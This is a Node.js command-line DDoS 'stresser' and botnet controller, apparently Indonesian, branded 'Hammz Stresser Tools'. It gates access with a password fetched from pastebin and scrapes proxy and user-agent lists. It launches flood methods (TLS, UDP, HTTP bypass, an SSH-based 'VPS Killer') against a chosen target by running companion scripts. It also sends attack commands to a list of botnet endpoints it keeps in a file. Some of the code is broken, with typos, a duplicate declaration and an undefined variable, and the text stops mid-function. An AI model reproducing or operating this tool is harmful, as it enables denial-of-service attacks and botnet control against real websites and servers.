#!/usr/bin/env node

const { TelegramBot } = require('node-telegram-bot-api')
const { exec, spawn  } = require('child_process')
const readline = require('readline')
const url = require('url')
const fs = require('fs')
const axios = require('axios')
const path = require('path')
const version = 'requeire(cheros)'
let processList = [];

const hammz = readline.createInterface({
  input: process.stdin,
  output: process.stdout
})
// [========================================] //
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
// [========================================] //
async function banner() {
console.clear()
console.log(`
          \x1b[1m\x1b[35m
    ____  __    ___   ________ __ __  ______  __    ______
   / __ )/ /   /   | / ____/ //_// / / / __ \/ /   / ____/
  / __  / /   / /| |/ /   / ,<  / /_/ / / / / /   / __/   
 \x1b[34m/ /_/ / /___/ ___ / /___/ /| |/ __  / /_/ / /___/ /___   
/_____/_____/_/  |_\____/_/ |_/_/ /_/\____/_____ /_____/   
                                                          ⠀⠀⠀⠀⠀⠀                       \x1b[0m
\x1b[38;5;201m╔══════════════════════════════════════╗\x1b[1;37m
      OWNER      : HammzXG
      Telegram   : t.me/HammzXG
\x1b[38;5;201m╚══════════════════════════════════════╝\x1b[0m
`)}
// [========================================] //
async function scrapeProxy() {
  try {
    const response = await fetch('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt');
    const data = await response.text();
    fs.writeFileSync('proxy.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}
// [========================================] //
async function scrapeUserAgent() {
  try {
    const response = await fetch('https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt');
    const data = await response.text();
    fs.writeFileSync('ua.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}
// [========================================] //
function clearProxy() {
  if (fs.existsSync('proxy.txt')) {
    fs.unlinkSync('proxy.txt');
  }
}
// [========================================] //
function clearUserAgent() {
  if (fs.existsSync('ua.txt')) {
    fs.unlinkSync('ua.txt');
  }
}
// [========================================] //
async function bootup() {
  try {
    console.log(`|| ▓░░░░░░░░░ || 10%`);
    conlose.log(`|| Wait For Installing...`);
    await exec(`npm i axios cheerio child_process chalk puppeteer puppeteer-extra puppeteer-extra-plugin-stealth cluster colors cypto http2 https http http-wrapper fg fs colors user-agent ssh2 express minimist net randomstring hpack gradient-string header-generator random-useragent path tls url os node-telegram-bot-api`)
    console.log(`|| Succes Installing Module...`);
    console.log(`|| ▓▓░░░░░░░░ || 20%`);
    const getLatestVersion = await fetch('https://pastebin.com/raw/bz3pV5NJ');
    const latestVersion = await getLatestVersion.text()
    console.log(`|| ▓▓▓░░░░░░░ || 30%`);
    if (version === latestVersion.trim()) {
    console.log(`|| ▓▓▓▓▓▓░░░░ || 60%`);
    
    const CihPeler = await fetch('https://pastebin.com/raw/6KGWQJKU');
    const password = await CihPeler.text();
    await console.log(`ENTER THIS PASSWORD`)
    hammz.question('[\x1b[1m\x1b[35mPASSWORD\x1b[0m]: \n', async (skibidi) => {
      if (skibidi === password.trim()) {
        console.log(`SUCCES LOGIN`)
        await scrapeProxy()
        console.log(`|| ▓▓▓▓▓▓▓░░░ || 70%`)
        await scrapeUserAgent()
        console.log(`|| ▓▓▓▓▓▓▓▓▓▓ || 100%`)
        await sleep(700)
        console.clear()
        console.log(`Welcome To Hammz Stresser Tools ${version}`)
        await sleep(1000)
		    await banner()
        console.log(`═══════════════════════════════════════════════════════════════════════════════════`)
        sigma()
      } else {
        console.log(`PASSWORD SALAH TOLOL !!!`)
        process.exit(-1);
      }
    }) 
  } else {
      console.log(`This Version Is Outdated. ${version} => ${latestVersion.trim()}`)
      await exec(`npm uninstall -g prmnmd-tuls`)
      await exec(`npm i -g prmnmd-tuls`)
      console.log(`Restart Tools Please`)
      process.exit()
    }
  } catch (error) {
    console.log(`Are You Online?`)
  }
}
// ====== //
async function pushOngoing(target, methods, duration) {
  const startTime = Date.now();
  processList.push({ target, methods, startTime, duration })
  setTimeout(() => {
    const index = processList.findIndex((p) => p.methods === methods);
    if (index !== -1) {
      processList.splice(index, 1);
    }
  }, duration * 1000);
}
// [========================================] //
function ongoingAttack() {
  console.log("\nOngoing Attack:\n");
  processList.forEach((process) => {
console.log(`Target: ${process.target}
Methods: ${process.methods}
Duration: ${process.duration} Seconds
Since: ${Math.floor((Date.now() - process.startTime) / 1000)} seconds ago\n`);
  });
}
// [========================================] //
async function handleAttackCommand(args) {
  if (args.length < 3) {
    console.log(`Example: tls <target>  <port> <duration>
tls https://google.com 433 120`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;

console.clear()
console.log(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀
⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀
⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀

                      Attack Has Been Launched
========================================================================
Status   : \x1b[38;5;160mAttack Has Successfull Launched\x1b[0m
Target   : ${target}
Duration : ${duration}
Methods  : ${methods}
========================================================================
ISP      : ${result.isp}
Ip       : ${result.query}
AS       : ${result.as}
========================================================================
`)
} catch (error) {
  console.log(`Oops Something Went wrong`)
}
const metode = path.join(__dirname, `${methods}`);
  if (methods === 'bypass') {
   pushOngoing(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 64 10 proxy.txt`)
	sigma()
          sigma()
 } else if (methods === 'bomb') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
 } else if (methods === 'raw') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
 } else if (methods === 'reset') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
 } else if (methods === 'resetv2') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
 } else if (methods === 'udp') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
 } else if (methods === 'mix') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
 } else if (methods === 'kill') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 32 10 proxy.txt`)
          sigma()
 } else if (methods === 'uam') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} GET ${target} ${duration} 10 90 proxy.txt --full`)
          sigma()
 } else if (methods === 'udp') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} GET ${target} ${duration} 10 90 proxy.txt --full`)
          sigma()
 } else if (methods === 'floodv2') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
 } else if (methods === 'flood') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 10 90 proxy.txt`)
          sigma()
 } else if (methods === 'ninja') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 10 90 proxy.txt --full`)
          sigma()
 } else if (methods === 'httpx') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 64 10 proxy.txt`)
          sigma()
 } else if (methods === 'mixed') {
       pushOngoing(target, methods, duration)
const bomb = path.join(__dirname, `HammzXBOMB`);
const kill = path.join(__dirname, `HammzXKILL`);
const uam = path.join(__dirname, `HammzXUAM`);
const mix = path.join(__dirname, `HammzXMIX`);
const tls = path.join(__dirname, `HammzXTLS`);
const udp = path.join(__dirname, `HammzXUDP`);
const raw = path.join(__dirname, `HammzXRAW`);
const flood = path.join(__dirname, `HammzXFLOOD`);
const floodv2 = path.join(__dirname, `HammzXFLOODV2`);
const reset = path.join(__dirname, `HammzXRESET`);
const resetv2 = path.join(__dirname, `HammzXRESETV2`);
const ninja = path.join(__dirname, `HammzXNJA`);
const httpx = path.join(__dirname, `HammzXHTTPX`);
const bypass = path.join(__dirname, `HammzXBYPASS`);
const mix = path.join(__dirname, `HammzXMIX`);
        exec(`node ${bomb} ${target} ${duration} 32 8 proxy.txt`)
        exec(`node ${kill} ${target} ${duration} 100 10 proxy.txt`)
        exec(`node ${uam} ${target} ${duration} 32 8 proxy.txt`)
        exec(`node ${mix} ${target} ${duration} 32 8 proxy.txt`)
        exec(`node ${tls} ${target} ${duration} 32 8 proxy.txt`)
        exec(`node ${flood} ${target} ${duration} 32 8 proxy.txt`)
        exec(`node ${floodv2} ${target} ${duration} 100 10 proxy.txt`)
        exec(`node ${reset} ${target} ${duration} 32 8 proxy.txt`)
        exec(`node ${resetv2} ${target} ${duration} 32 8 proxy.txt`)
        exec(`node ${mix} ${target} ${duration} 32 8 proxy.txt`)
        exec(`node ${udp} ${target} ${duration} 32 8 proxy.txt`)
        exec(`node ${bypass} ${target} ${duration} 100 10 proxy.txt`)
        exec(`node ${httpx} ${target} ${duration} 32 8 proxy.txt`)
        exec(`node ${raw} ${target} ${duration} 32 8 proxy.txt`)
          sigma()
 } else {
    console.log(`Method ${methods} not recognized.`);
  }
};
// [========================================] //
function methodsss() {
    
    const methodsData = JSON.parse(fs.readFileSync('methods.json', 'utf-8'));

    console.log(`                          Methods`);
    console.log(` NAME      │ DESCRIPTION                                   │ DURATION`);
    console.log(`───────────┼───────────────────────────────────────────────┼──────────`);

    methodsData.forEach(method => {
        console.log(
            `${method.name.padEnd(10)} │ ${method.description.padEnd(45)} │ ${method.duration.padEnd(5)}`
        );
    });
}

// Logika untuk menjalankan perintah
const command = process.argv[2]; 
// ===========================================//
async function Botnethitam(args) {
    if (args.length < 3) {
        console.log(`Example: botnet <target> <duration> <methods>
botnet https://google.com 120 flood`);
        sigma();
        return;
    }

    const [target, duration, methods] = args;
    try {
        const parsing = new url.URL(target);
        const hostname = parsing.hostname;
        const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`);
        const result = scrape.data;

        let botnetData;
        let successCount = 0;
        const timeout = 20000;
        const validEndpoints = [];

        // Load botnet data
        try {
            botnetData = JSON.parse(fs.readFileSync('./botnet.json', 'utf8'));
        } catch (error) {
            console.error('Error loading botnet data:', error.message);
            botnetData = { endpoints: [] };
        }

        // Kirim permintaan ke setiap endpoint
        const requests = botnetData.endpoints.map(async (endpoint) => {
            const apiUrl = `${endpoint}?target=${target}&time=${duration}&methods=${methods}`;

            try {
                const response = await axios.get(apiUrl, { timeout });
                if (response.status === 200) {
                    successCount++;
                    validEndpoints.push(endpoint);
                }
            } catch (error) {
                console.error(`Error sending request to ${endpoint}: ${error.message}`);
            }
        });

        await Promise.all(requests);

        // Simpan endpoint yang valid kembali ke file
        botnetData.endpoints = validEndpoints;
        try {
            fs.writeFileSync('./botnet.json', JSON.stringify(botnetData, null, 2));
        } catch (error) {
            console.error('Error saving botnet data:', error.message);
            sigma();
        }

        // Tambahkan proses ke daftar proses aktif
        const endTime = Date.now() + duration * 1000;
        processList.push({
            ip: result.query,
            target,
            startTime: Date.now(),
            endTime,
            duration,
            methods,
        });

        // Cetak detail serangan
        console.clear();
        console.log(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀
⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀
⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀

                      Attack Has Been Launched
========================================================================
Target Detail
 \x1b[1;37m  Attacks Details
\x1b[1;37m      Status:     [\x1b[1;32m Attack Sent Successfully All Server \x1b[1;37m]
\x1b[1;37m      Host:       [\x1b[1m\x1b[36m ${target}  \x1b[1;37m]
\x1b[1;37m      Time:       [\x1b[1m\x1b[36m ${duration} \x1b[1;37m]
\x1b[1;37m      Methods:    [\x1b[1m\x1b[36m ${methods} \x1b[1;37m]
\x1b[1;37m      Server:     [\x1b[1m\x1b[36m ${successCount} \x1b[1;37m]
\x1b[1;37m  Server Details
\x1b[1;37m      ISP:        [\x1b[1m\x1b[36m ${result.isp} \x1b[1;37m]
\x1b[1;37m      IP:         [\x1b[1m\x1b[36m ${result.query} \x1b[1;37m]
\x1b[1;37m      ASN:        [\x1b[1m\x1b[36m ${result.as} \x1b[1;37m]
`);
        sigma();
    } catch (error) {
        console.error('Terjadi kesalahan:', error.message);
    }
}
// [========================================] //
async function processBotnetEndpoint(args) {
    if (args.length < 1) {
    console.log(`Example: add-server <endpoints>
add-botnet http://1.1.1.1:2000/permen`);
    sigma();
	return
  }
    try {
        const parsedUrl = new url.URL(args);
        const hostt = parsedUrl.host;
        const endpoint = 'http://' + hostt + '/permen';

        // Load botnet data
        let botnetData;
        try {
            const data = await fs.promises.readFile('./botnet.json', 'utf8');
            botnetData = JSON.parse(data);
        } catch (error) {
            console.error('Error loading botnet data:', error.message);
            botnetData = { endpoints: [] };
        }

        // Check if endpoint already exists
        if (botnetData.endpoints.includes(endpoint)) {
            return console.log(`Endpoint ${endpoint} is already in the botnet list.`);
        }

        // Add endpoint and save data
        botnetData.endpoints.push(endpoint);
        try {
            await fs.promises.writeFile('./botnet.json', JSON.stringify(botnetData, null, 2));
        } catch (error) {
            console.error('Error saving botnet data:', error.message);
            return console.log('Error saving botnet data.');
        }

        // Reply with success message
        console.log(`Endpoint ${endpoint} added to botnet.`);
        sigma()
    } catch (error) {
        console.error('Error processing botnet endpoint:', error.message);
        console.log('An error occurred while processing the endpoint.');
        sigma()
    }
}
// [========================================] //
async function checkBotnetEndpoints() {
    let botnetData;
    let successCount = 0;
    const timeout = 20000;
    const validEndpoints = [];

    // Load botnet data
    try {
        botnetData = JSON.parse(fs.readFileSync('./botnet.json', 'utf8'));
    } catch (error) {
        console.error('Error loading botnet data:', error.message);
        botnetData = { endpoints: [] };
    }

    // Send requests to each endpoint
    const requests = botnetData.endpoints.map(async (endpoint) => {
        const apiUrl = `${endpoint}?target=test&time=1&methods=ninja`;

        try {
            const response = await axios.get(apiUrl, { timeout });
            if (response.status === 200) {
                successCount++;
                validEndpoints.push(endpoint);
            }
        } catch (error) {
            console.error(`Error sending request to ${endpoint}: ${error.message}`);
        }
    });

    await Promise.all(requests);

    // Save valid endpoints back to the file
    botnetData.endpoints = validEndpoints;
    try {
        fs.writeFileSync('./botnet.json', JSON.stringify(botnetData, null, 2));
    } catch (error) {
        console.error('Error saving botnet data:', error.message);
        sigma()
    }

    // Reply with the results
    console.log(`Checked endpoints. ${successCount} botnet endpoint(s) are online.`);
    sigma()
}
// [========================================] //
async function monitorOngoingAttacks() {
    // Filter proses yang masih berjalan
    processList = processList.filter((process) => {
        const remaining = Math.max(0, Math.floor((process.endTime - Date.now()) / 1000));
        return remaining > 0;
    });

    if (processList.length === 0) {
        console.log("Sorry, But No Attack Took In Place.");
        sigma();
        return;
    }

    // Membuat tabel serangan
    let attackDetails = "\n=== Ongoing Attacks ===\n";
    attackDetails += `\n`;
    attackDetails += `│  #  │        HOST          │ SINCE │ DURATION │ METHOD  │\n`;
    attackDetails += `├─────┼──────────────────────┼───────┼──────────┼─────────┤\n`;

    // Isi tabel dengan data proses
    processList.forEach((process, index) => {
        const host = process.ip || process.target;
        const since = Math.floor((Date.now() - process.startTime) / 1000); // Waktu dalam detik sejak serangan dimulai
        const duration = `${process.duration} sec`; // Menampilkan durasi dalam detik

        // Baris data
        attackDetails += `│ ${String(index + 1).padEnd(3)} │ ${host.padEnd(20)} │ ${String(since).padEnd(5)} │ ${duration.padEnd(8)} │ ${process.methods.padEnd(7)} │\n`;
    });

    // Garis bawah tabel
    attackDetails += `└─────┴──────────────────────┴───────┴──────────┴─────────┘\n`;

    console.log(attackDetails);
    sigma();
}
// [========================================] //
async function floodv2(args) {
  if (args.length < 2) {
    console.log(`Example: floodv2 <target> <duration>
floodv2 123.456.789.10 120`);
    sigma();
	return
  }
const [target, duration] = args
try {
const scrape = await axios.get(`http://ip-api.com/json/${target}?fields=isp,query,as`)
const result = scrape.data;

console.log(`Target Detail
 \x1b[1;37m  Attacks Details
\x1b[1;37m      Status:     [\x1b[1;32m Attack Sent Successfully All Server \x1b[1;37m]
\x1b[1;37m      Host:       [\x1b[1m\x1b[36m ${target}  \x1b[1;37m]
\x1b[1;37m      Port:       [\x1b[1m\x1b[36m 443 \x1b[1;37m]
\x1b[1;37m      Time:       [\x1b[1m\x1b[36m ${duration} \x1b[1;37m]
\x1b[1;37m      Methods:    [\x1b[1m\x1b[36m kill-ping \x1b[1;37m]
\x1b[1;37m  Target Details
\x1b[1;37m      ASN:        [\x1b[1m\x1b[36m ${result.as} \x1b[1;37m]
\x1b[1;37m      ISP:        [\x1b[1m\x1b[36m ${result.isp} \x1b[1;37m]
\x1b[1;37m      IP:        [\x1b[1m\x1b[36m ${result.query} \x1b[1;37m]
`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
}

const metode = path.join(__dirname, `HammzXFLOODV2`);
exec(`node ${metode} ${target} 66507 6 1 ${duration}`)
sigma()
};
// [========================================] //
async function killdo(args) {
  if (args.length < 2) {
    console.log(`Example: killdo <target> <duration>
killdo 123.456.78.910 300`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
console.clear()
console.log(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀
⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀
⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀

                    VPS Killer Has Been Launched
========================================================================
Target   : ${target}
Duration : ${duration}
Methods  : Digital Ocean Killer
Creator  : HammzXG`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
}
const raw = path.join(__dirname, `HammzXRAW`);
const ninja = path.join(__dirname, `HammzXNJA`);
const ssh = path.join(__dirname, `HammzXSSH`);
exec(`node ${ssh} ${target} 22 root ${duration}`)
exec(`node ${ninja} http://${target} ${duration}`)
exec(`node ${raw} http://${target} ${duration}`)
sigma()
};
// [========================================] //
async function udp_flood(args) {
  if (args.length < 3) {
    console.log(`Example: udp-flood <target> <port> <duration>
udp-flood 123.456.78.910 53 300`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
console.clear()
console.log(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀
⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀
⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀

                    UDP Raw Flood Attack Launched
========================================================================
Target   : ${target}
Duration : ${duration}
Methods  : UDP Raw
Creator  : HammXG`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
}

const metode = path.join(__dirname, `HammzXUDP`);
exec(`node ${metode} ${target} ${port} ${duration}`)
sigma()
};
// [========================================] //
async function flood(args) {
  if (args.length < 3) {
    console.log(`Example: .flood <target> <port> <duration>
flood https://contoh.com 443 60`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
	const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;

console.clear()
console.log(`⠀ATTACK SUCCESSFULLY SENT
         
\x1b[38;5;201m╔══════════════════════════════════════════════════════════════════╗\x1b[1m
\x1b[1;37m  Attacks Details
\x1b[1;37m      Status:     [\x1b[1;32m Attack Sent Successfully All Server \x1b[1;37m]
\x1b[1;37m      Host:       [\x1b[1m\x1b[36m ${target}  \x1b[1;37m]
\x1b[1;37m      Port:       [\x1b[1m\x1b[36m 443 \x1b[1;37m]
\x1b[1;37m      Time:       [\x1b[1m\x1b[36m ${duration} \x1b[1;37m]
\x1b[1;37m      Methods:    [\x1b[1m\x1b[36m FLOOD \x1b[1;37m]
\x1b[38;5;201m╚════════════════════════════════════════════════════════════════════╝\x1b[0m
\x1b[38;5;201m╔════════════════════════════════════════════════════════════════════╗\x1b[0m 
\x1b[1;37m      ASN:        [\x1b[1m\x1b[36m ${result.as} \x1b[1;37m]
\x1b[1;37m      ISP:        [\x1b[1m\x1b[36m ${result.isp} \x1b[1;37m]
\x1b[1;37m      IP:        [\x1b[1m\x1b[36m ${result.query} \x1b[1;37m]
\x1b[38;5;201m╚════════════════════════════════════════════════════════════════════╝\x1b[0m 
  \x1b[1;37mPlease After Attack Type \x1b[1;32m[ cls ]\x1b[1;37m To Return To The Home Menu \x1b[1;32m[ Note : Not Spam Attack ]\x1b[1;37m
`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
    sigma()
}
const metode = path.join(__dirname, `HammzXFLOOD`);
exec(`node ${metode} ${target} ${duration} 50 4 proxy.txt`)
sigma()
};
// [========================================] //
async function tls(args) {
  if (args.length < 3) {
    console.log(`Example: .tls <target> <port> <duration>
tls https://contoh.com 443 60`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;
console.clear()
console.log(`ATTACK SUCCESSFULLY SENT
         
\x1b[38;5;201m╔══════════════════════════════════════════════════════════════════╗\x1b[1m
\x1b[1;37m  Attacks Details
\x1b[1;37m      Status:     [\x1b[1;32m Attack Sent Successfully All Server \x1b[1;37m]
\x1b[1;37m      Host:       [\x1b[1m\x1b[36m ${target}  \x1b[1;37m]
\x1b[1;37m      Port:       [\x1b[1m\x1b[36m 443 \x1b[1;37m]
\x1b[1;37m      Time:       [\x1b[1m\x1b[36m ${duration} \x1b[1;37m]
\x1b[1;37m      Methods:    [\x1b[1m\x1b[36m TLS \x1b[1;37m]
\x1b[38;5;201m╚════════════════════════════════════════════════════════════════════╝\x1b[0m
\x1b[38;5;201m╔════════════════════════════════════════════════════════════════════╗\x1b[0m 
\x1b[1;37m      ASN:        [\x1b[1m\x1b[36m ${result.as} \x1b[1;37m]
